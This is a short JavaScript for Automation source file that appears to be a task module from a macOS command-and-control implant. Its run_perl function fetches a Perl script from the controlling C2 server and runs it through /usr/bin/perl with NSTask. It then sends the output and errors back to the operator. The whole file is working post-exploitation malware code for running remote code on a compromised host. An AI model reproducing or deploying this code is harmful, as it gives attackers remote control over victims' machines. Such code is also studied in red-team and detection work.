exports.run_perl = function(task, command, params){
    //Parse JSON to retrieve input
    let perlscript = "";
    try {
    let config = JSON.parse(params);
        if(config.hasOwnProperty("script")){
            let perl_data = C2.upload(task, config['script']);
            if(typeof perl_data === "string"){
                return{"user_output":"Failed to get contents of file", "completed": true, "status": "error"};
            }
            perlscript = $.NSString.alloc.initWithDataEncoding(perl_data, $.NSUTF8StringEncoding);
        }
        else{
            return {"user_output":"Need to supply a valid file to download", "completed": true, "status": "error"};
        }
        let perlData = perlscript.dataUsingEncoding($.NSUTF8StringEncoding);
            // Prepare NSTask
            let perltask = $.NSTask.alloc.init;
            perltask.setLaunchPath("/usr/bin/perl");
            
            // Set up input and output pipes
            const inputPipe = $.NSPipe.pipe;
            const outputPipe = $.NSPipe.pipe;
            const errorPipe = $.NSPipe.pipe;
            
            perltask.setStandardInput(inputPipe);
            perltask.setStandardOutput(outputPipe);
            perltask.setStandardError(errorPipe);
            
            // Write input to the process
            const inputHandle = inputPipe.fileHandleForWriting;
            inputHandle.writeData(perlData);
            inputHandle.closeFile;
            
            // Launch task
            perltask.launch;  
            perltask.waitUntilExit;
            
            // Read output
            const outputHandle = outputPipe.fileHandleForReading;
            const errorHandle = errorPipe.fileHandleForReading;
            const outputData = outputHandle.readDataToEndOfFile;
            const errorData = errorHandle.readDataToEndOfFile; 
            const outputString = $.NSString.alloc.initWithDataEncoding(outputData, $.NSUTF8StringEncoding);
            const errorString = $.NSString.alloc.initWithDataEncoding(errorData, $.NSUTF8StringEncoding);
            // Aggregate Response
            let response1pe = ObjC.unwrap(outputString);
            let response2pe = ObjC.unwrap(errorString);
            let responsepe = response1pe + response2pe;
            return {"user_output":responsepe, "completed": true};
     }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
}
